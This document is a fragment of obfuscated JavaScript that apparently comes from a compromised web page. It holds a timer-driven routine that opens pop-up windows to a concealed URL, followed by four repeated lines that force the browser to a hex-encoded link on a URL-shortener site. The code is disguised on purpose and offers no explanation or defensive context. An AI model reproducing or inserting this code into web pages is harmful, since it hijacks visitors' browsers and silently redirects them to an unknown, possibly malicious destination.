_0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";